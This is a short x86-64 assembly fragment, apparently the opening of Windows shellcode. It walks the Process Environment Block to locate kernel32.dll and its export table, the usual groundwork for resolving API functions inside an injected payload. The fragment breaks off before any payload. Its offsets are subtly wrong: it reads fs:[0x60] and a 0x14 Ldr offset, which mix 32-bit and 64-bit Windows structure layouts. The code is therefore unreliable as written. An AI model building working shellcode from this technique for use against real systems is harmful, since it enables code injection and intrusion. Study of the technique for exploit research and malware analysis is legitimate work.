;https://www.felixcloutier.com/x86/lods:lodsb:lodsw:lodsd:lodsq

global _start

section .text
_start:

	; Find the kernel32.dll base address
	xor rcx, rcx											; zero rcx 
	mov rax, fs:[rcx + 0x60]					; rax = PEB   fs is a segment reg pointing at TEB
	mov rax, [rax + 0x14]							; rax = PEB->LDR
	mov rsi, [rax + 0x20]							; rsi = PEB->LDR->InMemoryOrderModuleList
																		; doubly linked list of loaded modules for process
	lodsq															; rax = Second Module (generally ntdll.dll)
	xchg rsi, rax											; rsi = Second Module, rax = PEM->LDR->InMemOrd 
	lodsq															; rax = Third Module (generally kernel32.dll)
	mov rbx, [rax + 0x20]							; rbx = DLLbase of kernel32.dll

	; Find the export table of kernerl32.dll (Data Directory in PE header)
	mov rdx, [rbx + 0x3c]							; rdx = e_lfanew in DOS header
	add rdx, rbx											; rdx = PE header
	mov rdx, [rdx + 0x78]							; rdx = Export Directory
